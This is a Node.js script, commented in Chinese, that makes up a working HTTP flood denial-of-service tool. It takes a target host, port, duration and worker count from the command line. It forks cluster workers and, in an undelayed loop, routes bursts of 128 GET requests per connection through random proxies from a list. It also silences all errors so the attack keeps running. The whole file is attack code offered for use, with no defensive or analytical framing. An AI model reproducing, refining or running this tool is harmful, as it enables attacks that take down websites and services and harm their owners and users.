// 监听未捕获的异常
process.on('uncaughtException', function() {});
// 监听未处理的Promise拒绝
process.on('unhandledRejection', function() {});

const net = require('net'); // 引入网络模块
const fs = require('fs'); // 引入文件系统模块
const url = require('url'); // 引入URL模块
const cluster = require('cluster'); // 引入集群模块

// 读取代理列表
var proxies = fs.readFileSync('proxies.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');

// 目标POST地址
var tarPOST = "http://" + process.argv[2] + ":" + process.argv[3];

// 解析目标地址
var parsed = url.parse(tarPOST);

if (cluster.isMaster) {
    // 如果是主进程，创建工作进程
    for (let i = 0; i < process.argv[5]; i++) {
        cluster.fork();
    }

    // 设置超时后退出进程
    setTimeout(() => {
        process.exit(1);
    }, process.argv[4] * 1000);
}

// const AllUA = fs.readFileSync("header.txt", 'utf-8').toString().replace(/\r/g, '').split('\n'); // 读取用户代理

// 定时任务，定期发送请求
setInterval(function() {
    // 随机选择一个代理
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    // 连接到代理服务器
    var socket = net.connect(proxy[1], proxy[0]);
    socket.setKeepAlive(false, 0);
    socket.setTimeout(5000);

    // 发送多次请求
    for (let j = 0; j < 128; j++) {
        socket.write('GET ' + tarPOST + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nuser-agent: ' + '\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-HK,zh;q=0.9,en;q=0.8,zh-CN;q=0.7,en-US;q=0.6\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\n\r\n');
    }

    // 处理数据
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy(); // 销毁socket
            return delete socket;
        }, 5000);
    });
});
